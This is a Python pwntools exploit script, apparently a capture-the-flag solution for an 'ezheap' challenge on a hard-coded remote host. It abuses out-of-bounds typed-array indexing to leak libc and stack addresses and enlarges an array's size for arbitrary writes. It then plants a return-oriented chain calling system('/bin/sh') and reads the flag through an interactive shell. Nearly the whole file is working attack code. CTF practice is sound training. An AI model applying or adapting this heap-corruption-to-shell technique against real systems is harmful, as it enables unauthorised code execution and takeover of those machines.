#!/usr/bin/env python3

from pwn import *

exe = ELF("./ezheap_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    #r = conn()
    r = remote("123.60.25.24", 20077)

    def s(data):
        r.sendafter(">>\n", data)


    def sl(data):
        r.sendlineafter(">>\n", data)

    def alloc(typ, size, index):
        print("ALLOCATION ", index)
        #print("ALLOC " + str(index))
        r.sendlineafter("enter your choice>>\n", "1")
        sl(str(typ))
        sl(str(size))
        sl(str(index))

    def edit(typ, index, elem, val):
        sl("2")
        sl(str(typ))
        sl(str(index))
        sl(str(elem))
        sl(str(val))

    def view(typ, index, elem):
        sl("3")
        sl(str(typ))
        sl(str(index))
        sl(str(elem))
        if r.recv(1) == b"v":
            r.recvuntil(">>\n")
            return int(r.recvline().strip())
        else:
            return 0

    def delete(typ, index):
        sl("4")
        sl(str(typ))
        sl(str(index))


        """
    1. ByteArray
    2. Uint16Array
    3. Uint32Array
    4. FloatArray

    """
    try:
        alloc(1, 0xc, 0)
        
        # spray
        n = 40
        for i in range(n):
            alloc(3, 0xc, i)
        
        leak = int(view(3, -1024, 3))
        
        log.info("MMAPED CHUNK addr : 0x%x", leak)
        
        if leak == 0:
            raise Exception("Bad luck")
        
        libc.address = leak + 0xff0
        log.info("Libc base @ 0x%x", libc.address)

        write_from = int(view(3, -1024, 6))
        
        print("ENVIRON ", hex(libc.sym['environ']))
        print("WRITE FROM ", hex(write_from))
        
        if write_from == 0x0:
            raise Exception("Bad luck")

        offset = int((libc.sym['environ'] - write_from)/4)

        print("OFFSET :", hex(offset))
        
        # Make the size of one of them large
        edit(3, -1024, 5, 0xffffffff)

        for i in range(n):
            leak = int(view(3, i, offset))
            print("Got ", hex(leak))
            if leak & 0xff != 0:
                print("i is ", i)
                break
        
        stack_return = leak - 0x100
        rop = leak - 0x100 + 0x50
        offset_to_stack = int((stack_return - write_from)/4)
        offset_to_rop = int((rop - write_from)/4)
        one_gadget = libc.address + 0x74cd0
        print("OFFSET TO RIP:", offset_to_stack)
        
        edit(3, i, offset_to_rop, libc.sym['system'])
        edit(3, i, offset_to_rop+2, next(libc.search(b"/bin/sh\x00")))

        edit(3, i, offset_to_stack, one_gadget)
        
        r.sendline("cat flag*")
        r.interactive()

    except:
        r.close()

if __name__ == "__main__":
    while True:
        main()
